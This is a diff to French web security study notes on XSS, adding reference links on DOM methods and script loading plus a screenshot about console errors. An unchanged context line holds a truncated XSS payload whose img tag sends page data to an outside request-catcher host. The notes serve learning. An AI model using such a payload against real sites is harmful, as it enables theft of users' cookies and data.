@@ -162,6 +162,10 @@ Voir aussi `elements`
 
 - https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_loc_hash
 
+`getElements`
+
+- https://www.w3schools.com/js/tryit.asp?filename=tryjs_dom_getelementsbytagname
+
 ### XSS
 
  - https://beta.hackndo.com/attaque-xss/
@@ -169,6 +173,7 @@ Voir aussi `elements`
  - https://learn-cyber.net/article/Self-XSS-Attacks
  - https://learn-cyber.net/article/Reflected-XSS-Attacks
  - https://www.cobalt.io/blog/csp-and-bypasses
+ - https://javascript.info/script-async-defer
 
 `Protection`: HTML-encode les entrées utilisateurs, CSP
 
@@ -189,6 +194,10 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 [Dom Based XSS](https://blog.cyxo.re/pwnme-2022/pimp-my-bicycle/)
 
 -> appel ou accès aux éléments du DOM (ex document.getElementByID)
+
+![console](./console.png)
+
+-> accès aux erreurs
 
 [CSP Bypass](https://csplite.com/csp320/)
 
